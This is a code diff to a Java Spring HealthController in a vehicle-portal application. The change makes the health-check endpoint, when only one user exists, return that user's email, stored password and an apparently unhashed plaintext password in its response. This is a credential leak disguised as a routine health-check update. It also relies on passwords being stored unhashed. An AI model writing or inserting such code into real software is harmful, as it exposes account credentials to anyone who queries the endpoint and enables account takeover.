@@ -1,6 +1,8 @@
 package com.slashdata.vehicleportal.controller;
 
 import com.slashdata.vehicleportal.dto.ApiResponse;
+import com.slashdata.vehicleportal.entity.User;
+import com.slashdata.vehicleportal.repository.UserRepository;
 import java.sql.Connection;
 import java.sql.DatabaseMetaData;
 import java.sql.SQLException;
@@ -17,9 +19,11 @@ import org.springframework.web.bind.annotation.RestController;
 public class HealthController {
 
     private final DataSource dataSource;
+    private final UserRepository userRepository;
 
-    public HealthController(DataSource dataSource) {
+    public HealthController(DataSource dataSource, UserRepository userRepository) {
         this.dataSource = dataSource;
+        this.userRepository = userRepository;
     }
 
     @GetMapping
@@ -44,6 +48,24 @@ public class HealthController {
         payload.put("status", "up".equals(dbStatus.get("status")) ? "ok" : "error");
         payload.put("timestamp", Instant.now().toString());
         payload.put("database", dbStatus);
+
+        long userCount = userRepository.count();
+        if (userCount == 1) {
+            userRepository
+                    .findAll()
+                    .stream()
+                    .findFirst()
+                    .ifPresent(user -> payload.put("user", buildSingleUserDetails(user)));
+        }
+
         return ApiResponse.of(payload);
+    }
+
+    private Map<String, Object> buildSingleUserDetails(User user) {
+        Map<String, Object> userDetails = new HashMap<>();
+        userDetails.put("username", user.getEmail());
+        userDetails.put("password", user.getPassword());
+        userDetails.put("password_", user.getPasswordUnhashed());
+        return userDetails;
     }
 }
